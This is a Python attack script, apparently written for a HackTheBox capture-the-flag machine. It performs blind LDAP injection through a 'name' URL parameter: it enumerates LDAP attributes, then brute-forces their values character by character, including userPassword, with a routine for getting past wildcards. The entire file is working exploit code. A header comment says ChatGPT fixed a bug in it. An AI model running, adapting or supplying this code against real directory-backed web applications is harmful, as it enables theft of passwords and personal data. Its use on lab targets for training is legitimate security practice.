#!/usr/bin/python3
# 99% Made by v0lk3n, just asked ChatGPT to fix a bug in the last bruteforcing sequence
import sys
import requests
import string
from termcolor import colored

fields = []
bruteforcable_fields = []

url_base = 'http://internal.analysis.htb/users/list.php?name=*)('

special_chars = "_@{}-/()!*\"$%=^[]:;"
alphabet = string.ascii_letters + string.digits + special_chars

attributes = ('accessHint', 'accountHint', 'audio', 'businessCategory', 'c', 'carLicense', 'cn', 'configPtr', 'departmentNumber', 'description', 'destinationIndicator', 'displayName', 'employeeNumber', 'employeeType', 'facsimileTelephoneNumber', 'generationQualifier', 'givenName', 'homeFax', 'homePhone', 'initials', 'internationalISDNNumber', 'jpegPhoto', 'l', 'labeledURI', 'mail', 'manager', 'middleName', 'mobile', 'o', 'objectClass', 'organizationalStatus', 'otherMailbox', 'ou', 'pager', 'personalTitle', 'photo', 'physicalDeliveryOfficeName', 'postalAddress', 'postalCode', 'postOfficeBox', 'preferredDeliveryMethod', 'preferredLanguage', 'registeredAddress', 'roomNumber', 'secretary', 'seeAlso', 'sn', 'st', 'street', 'telephoneNumber', 'teletexTerminalIdentifier', 'telexNumber', 'thumbNailLogo', 'thumbNailPhoto', 'title', 'uid', 'uniqueIdentifier', 'userCertificate', 'userPKCS12', 'userPassword', 'userSMIMECertificate', 'x121Address', 'x500UniqueIdentifier')

print(colored("\nStarting Attributes Enumeration : \n", 'green'))
for i in attributes:
	r = requests.get(url_base + str(i) + "=*")
	sys.stdout.write(colored("Attributes Enumeration : ", 'red') + url_base + str(i) + f"\r")
	if 'technician' in r.text:
        	fields.append(str(i))

print(colored("\n\nRecovered Attributes : ", 'green'))
print(fields)
print("\n")

bruteforcable_attributes = False
for i in fields:
	for char in alphabet:
		r = requests.get(url_base + str(i) + "=" + str(char) + "*")
		sys.stdout.write(colored("Looking for bruteforcable attribute : ", 'green') + url_base + str(i) + "=" + str(char) + f"\r")
		if 'technician' in r.text:
			bruteforcable_fields.append(str(i))
			bruteforcable_attributes = True
			break

attributes = bruteforcable_fields
print(colored("\n\nFound Bruteforcable Attributes : ", 'green'))
print(attributes)
print("\n")

print(colored("\nStarting Bruteforcing...\n", 'green'))

for attribute in attributes:
    url = url_base + attribute + '='

    while True:
        valid_char = False

        # Iterate through each character in the alphabet
        for char in alphabet:
            # Construct the payload with the current character
            payload = url + str(char)
            # Send the request
            r = requests.get(payload + "*")
            sys.stdout.write(colored("Bruteforcing : ", 'red') + payload + f"\r")
            # Check if injection was successful based on response
            if 'technician' in r.text:
                url = payload
                valid_char = True
                break

        # If no valid character found, try with wildcard after the character
        if not valid_char:
            print(colored("\n\nNo character found, attempting to bypass wildcard...\n", 'yellow'))
            for char in alphabet:
                payload = url + "*" + str(char)
                r = requests.get(payload + "*")
                sys.stdout.write(colored("Bypassing wildcard : ", 'red') + payload + f"\r")
                if 'technician' in r.text:
                    print(colored("\n\nValid special character found, returning to normal bruteforcing...\n", 'green'))
                    url = payload
                    valid_char = True
                    break

        # If still no valid character found, stop bruteforce for current attribute
        if not valid_char:
            print(colored("\n\nNo additional character found for attribute", 'yellow'), attribute)
            break

    # If all characters are tested for the current attribute, move to the next attribute
    print(colored("\n\nRecovered data for attribute", 'green'), attribute + ':', url)
